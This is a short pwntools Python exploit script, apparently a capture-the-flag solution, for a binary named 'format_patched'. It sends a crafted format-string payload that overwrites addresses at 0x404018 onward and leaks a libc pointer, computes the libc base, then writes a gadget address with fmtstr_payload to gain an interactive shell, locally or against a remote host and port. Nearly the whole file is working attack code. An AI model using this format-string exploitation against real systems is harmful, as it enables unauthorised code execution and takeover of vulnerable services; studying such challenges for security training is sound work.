from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './format_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
libc = ELF("./libc.so.6")
io = start()

fmtstr = b"%182c%11$lln%91c%12$hhn%47c%13$hhn%19$pL"+p64(0x404018)+p64(0x404019)+p64(0x40401a)
assert(len(fmtstr) == 0x40)
io.sendline(fmtstr)
io.recvline()
k = (int(io.recvline().split(b"0x")[1].split(b"L")[0],16) - libc.sym.__libc_start_main) & ~0xfff
info("Libc @ 0x%x", k)
libc.address = k

payload = fmtstr_payload(6,{0x404018:k+0x10a2fc},write_size="short")
io.sendlineafter(b"name\n", payload)

io.interactive()